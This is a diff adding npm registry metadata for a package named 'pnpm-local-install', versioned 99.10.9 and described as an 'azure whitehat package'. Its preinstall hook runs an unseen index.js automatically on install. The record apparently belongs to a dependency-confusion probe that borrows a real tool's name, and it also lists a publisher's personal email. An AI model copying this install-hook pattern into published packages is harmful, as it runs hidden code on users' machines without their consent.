@@ -1,0 +1,39 @@
+{
+    "name": "pnpm-local-install",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "pnpm-local-install@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-VgWFlDNF5W3f3EotfMwHlljlbB89Y0ViatoG0S24a6KUDzku1AOZrLAKY56CQlqDbcm4vnvPRBcBFxpLlg6ugg==",
+        "shasum": "f9367c1c882fe048ebcd098018c67610ebc77cc9",
+        "tarball": "https://registry.npmjs.org/pnpm-local-install/-/pnpm-local-install-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3582,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRE5CRA9TVsSAnZWagAAa9sP/iYKqx5Xb1hjpHDjeQ3j\nYkk2XHkrn37Pw3iluHVUYREAOZxCk/sJPY5vXAd0X+rIocBxrTBAmyqIuTN2\n3fMWbCb6Korj8ctllrJSo7tI9UfJhl0E0rvaMg0HsKvF5/CqqOcFy/LxE3AG\nxL0W5Yybut9/o45gG9sZAy15/rlEvV+Ef83bsc4uUVHVU8hfijZ8Ya8RD6S2\noSd9TjvZBKaOMn5/StKtC7gM/VLI5V3Hn1ecGN7xUv+msLflL7gzN59jsgaa\nDpL6UQs9FfSchQoyQ8pzfSrWrcADZRMONDhT/1TgcUFVjJX5OZ5kSI1U1Ldf\nLvWJloMuXcgMZ6au9ieJlIPoxOQMDxNqzDtk/F7QJh8WTkgKpMPdJaoahVJZ\nTJMGOfxpi/Fk6zsqsql4aWuJDcgLs3RvRff1upsMIp2em53yPUteVKUgIAVX\nF9sSZqLg+eyt2k+Y1Dcm0omlf3sH15wk65OM1dnPW41UMu5KbqvUDjFws+/G\ngeIV8FrhJZrGAHu3nTEJSccNcLZ1Fi6Ci71fy51cuUW2f8Zxn1wm3k26pnwB\nQYU99Pw2AcYr4kqWaScasu1W+igxqZ+toPQ4B4d/PCWvxdFeCa5m9vFvZN4m\njmsDTSzKSZ/GNOj/q4EgtdswZFUKJgs5pCBdBqUmUZkuETINRlLhj35tP+wc\nSVOt\r\n=yiz8\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/pnpm-local-install_99.10.9_1637945657474_0.16458358909473492"
+    },
+    "_hasShrinkwrap": false
+}
